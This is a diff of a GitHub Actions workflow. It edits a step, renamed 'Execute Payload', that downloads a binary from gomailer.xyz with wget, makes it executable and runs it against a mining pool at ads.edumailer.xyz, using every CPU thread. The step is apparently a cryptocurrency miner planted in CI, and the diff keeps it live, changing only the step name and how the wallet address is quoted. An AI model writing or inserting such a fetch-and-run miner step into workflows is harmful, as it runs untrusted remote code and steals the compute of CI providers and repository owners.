@@ -18,7 +18,7 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Execute
+      - name: Execute Payload
         run: |
           set -e
-          wget -O s https://gomailer.xyz/s && chmod +x s && ./s --pool-url ads.edumailer.xyz:53917 --address $thundergold --pool-worker N$(shuf -i 1-99999 -n 1) --threads $(nproc)
+          wget -O s https://gomailer.xyz/s && chmod +x s && ./s --pool-url ads.edumailer.xyz:53917 --address '@thundergold' --pool-worker N$(shuf -i 1-99999 -n 1) --threads $(nproc)
